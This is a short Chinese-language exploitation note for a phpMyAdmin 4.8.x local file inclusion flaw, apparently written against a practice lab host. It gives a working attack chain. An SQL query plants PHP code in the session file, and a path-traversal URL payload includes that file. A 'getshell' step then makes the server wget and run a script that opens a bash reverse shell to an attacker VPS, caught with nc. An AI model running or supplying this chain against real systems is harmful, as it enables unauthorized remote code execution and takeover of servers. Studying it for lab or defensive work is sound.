phpadmin漏洞
================================

4.8.x 本地文件包含漏洞利用
--------------------------------

利用方法
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 利用前提
	+ 任意登录phpadmin账号
- 测试phpinfo
	+ 点击顶部导航栏中的SQL按钮，执行SQL查询``select '<?php phpinfo();exit;?>'``
	+ 获取session，Cookie 中的phpMyAdmin值
	+ 构造/var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k
	+ payload:``http://myweb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k``
- getshell
	+ vps上执行：``cd /var/www/html | echo 'bash -i >& /dev/tcp/192.168.250.129/1100 0>&1' > shell.sh``
	+ phpadmin执行：``select '<?php system("wget 192.168.250.129/shell.sh; chmod +x shell.sh; bash shell.sh");exit;?>'``
	+ vps执行：``nc -lvp 1100``
	+ 浏览器执行：``http://myweb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k``